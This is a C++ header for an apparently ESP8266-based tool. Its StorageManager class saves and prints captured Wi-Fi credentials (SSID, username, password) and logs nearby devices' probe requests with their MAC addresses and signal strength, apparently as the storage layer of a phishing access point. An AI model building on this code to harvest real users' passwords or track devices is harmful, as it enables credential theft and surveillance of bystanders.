#ifndef STORAGE_H
#define STORAGE_H

#include <EEPROM.h>
#include <FS.h>
#include "config.h"
#include <ArduinoJson.h>

class StorageManager {
private:
    static const int CREDS_START = 100;
    static const int STORAGE_MEM_SIZE = STORAGE_SIZE;
    int currentIndex = CREDS_START;
    
    // File paths
    const char* CREDS_FILE = "/credentials.txt";
    const char* PROBES_FILE = "/probes.txt";
    const char* SETTINGS_FILE = "/settings.json";
    const char* SSIDS_FILE = "/ssids.txt";

public:
    void begin() {
        EEPROM.begin(STORAGE_MEM_SIZE);
        if (!SPIFFS.begin()) {
            formatFS();
        }
    }

    void saveCredentials(String ssid, String username, String password) {
        File f = SPIFFS.open(CREDS_FILE, "a");
        if (!f) return;

        StaticJsonDocument<200> doc;
        doc["ssid"] = ssid;
        doc["username"] = username;
        doc["password"] = password;
        doc["timestamp"] = millis();

        String jsonString;
        serializeJson(doc, jsonString);
        f.println(jsonString);
        f.close();
    }

    String readCredentials() {
        String output;
        File f = SPIFFS.open(CREDS_FILE, "r");
        if (!f) return "";

        while (f.available()) {
            String line = f.readStringUntil('\n');
            StaticJsonDocument<200> doc;
            DeserializationError error = deserializeJson(doc, line);
            
            if (!error) {
                output += "SSID: " + doc["ssid"].as<String>() + "\n";
                output += "User: " + doc["username"].as<String>() + "\n";
                output += "Pass: " + doc["password"].as<String>() + "\n";
                output += "-------------------\n";
            }
        }
        f.close();
        return output;
    }

    void clearCredentials() {
        SPIFFS.remove(CREDS_FILE);
    }

    void saveProbeRequest(String mac, String ssid, int rssi) {
        File f = SPIFFS.open(PROBES_FILE, "a");
        if (!f) return;

        StaticJsonDocument<200> doc;
        doc["mac"] = mac;
        doc["ssid"] = ssid;
        doc["rssi"] = rssi;
        doc["timestamp"] = millis();

        String jsonString;
        serializeJson(doc, jsonString);
        f.println(jsonString);
        f.close();
    }

    String readProbeRequests() {
        String output;
        File f = SPIFFS.open(PROBES_FILE, "r");
        if (!f) return "";

        while (f.available()) {
            String line = f.readStringUntil('\n');
            StaticJsonDocument<200> doc;
            DeserializationError error = deserializeJson(doc, line);
            
            if (!error) {
                output += "MAC: " + doc["mac"].as<String>() + "\n";
                output += "SSID: " + doc["ssid"].as<String>() + "\n";
                output += "RSSI: " + String(doc["rssi"].as<int>()) + "dBm\n";
                output += "-------------------\n";
            }
        }
        f.close();
        return output;
    }

    void clearProbeRequests() {
        SPIFFS.remove(PROBES_FILE);
    }

    bool saveSettings(const String& jsonSettings) {
        File f = SPIFFS.open(SETTINGS_FILE, "w");
        if (!f) return false;
        
        f.print(jsonSettings);
        f.close();
        return true;
    }

    String loadSettings() {
        File f = SPIFFS.open(SETTINGS_FILE, "r");
        if (!f) return "{}";
        
        String settings = f.readString();
        f.close();
        return settings;
    }

    void saveCustomSSIDs(const std::vector<String>& ssids) {
        File f = SPIFFS.open(SSIDS_FILE, "w");
        if (!f) return;
        
        for (const String& ssid : ssids) {
            f.println(ssid);
        }
        f.close();
    }

    std::vector<String> loadCustomSSIDs() {
        std::vector<String> ssids;
        File f = SPIFFS.open(SSIDS_FILE, "r");
        if (!f) return ssids;
        
        while (f.available()) {
            String ssid = f.readStringUntil('\n');
            ssid.trim();
            if (ssid.length() > 0) {
                ssids.push_back(ssid);
            }
        }
        f.close();
        return ssids;
    }

    uint32_t getFreeSpace() {
        FSInfo fs_info;
        SPIFFS.info(fs_info);
        return fs_info.totalBytes - fs_info.usedBytes;
    }

    void formatFS() {
        SPIFFS.format();
    }

    size_t getCredentialsCount() {
        File f = SPIFFS.open(CREDS_FILE, "r");
        if (!f) return 0;
        
        size_t count = 0;
        while (f.available()) {
            String line = f.readStringUntil('\n');
            if (line.length() > 0) count++;
        }
        f.close();
        return count;
    }

private:
    String getTimestamp() {
        unsigned long ms = millis();
        unsigned long seconds = ms / 1000;
        unsigned long minutes = seconds / 60;
        unsigned long hours = minutes / 60;
        
        char timestamp[9];
        sprintf(timestamp, "%02lu:%02lu:%02lu", 
                hours, minutes % 60, seconds % 60);
        return String(timestamp);
    }
};

extern StorageManager storageManager;

#endif 